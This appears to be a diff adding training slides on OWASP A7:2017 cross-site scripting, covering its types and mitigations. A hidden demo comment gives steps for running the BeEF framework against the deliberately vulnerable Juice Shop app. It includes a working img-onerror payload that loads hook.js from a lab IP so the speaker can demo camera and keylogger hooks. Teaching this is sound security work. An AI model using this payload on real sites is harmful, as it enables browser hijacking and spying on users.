@@ -1,0 +1,45 @@
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    ### A7:2017 - Cross-Site Scripting (XSS)
+    A type of injection in which malicious scripts are injected into otherwise benign websites, resulting in the execution of JavaScript within the browser.
+  </textarea>
+</section>
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    ## Types
+    - **Reflected** XSS: The application includes unvalidated and unescaped user input as part of HTML output.
+    - **Stored** XSS: The application stores unsanitized user input that is viewed at a later time.
+    - **DOM** XSS: The application's JavaScript manipulates the Document Object Model (DOM) without contacting the server, making abuse of these issues difficult to detect.
+  </textarea>
+</section>
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    # Demo
+    <!--
+      Spin up a Kali VM with a camera
+      Install and run dockerd
+      Run `docker run -\-rm -p 8000:3000 bkimminich/juice-shop`
+      Install and then run beef
+      Update the config.yaml to have a custom user/pass
+      Place the hook.js url in the script src below (this attack could use improvement):
+        <img src=nonexistant onerror="javascript:document.write('<script src=http://172.16.0.164:3000/hook.js />')">
+      Paste the above string in the juice-shop search bar, and then search for it to run the xss
+      Check the beef UI (UI URL from ./beef) for a successful hook
+      Demo a camera, keylogger, etc.
+      Consider demonstrating obfuscation like:
+       - https://portswigger.net/blog/xss-without-parentheses-and-semi-colons
+       - http://www.jsfuck.com/
+    -->
+  </textarea>
+</section>
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    #### Mitigations
+     - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
+     - [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
+     - Input validation of inbound data to the app.
+     - Encoding/parameterization of outbound data to the database.
+     - Validation of data from your database.
+     - Output encoding of all data from your app to the user.
+  </textarea>
+</section>
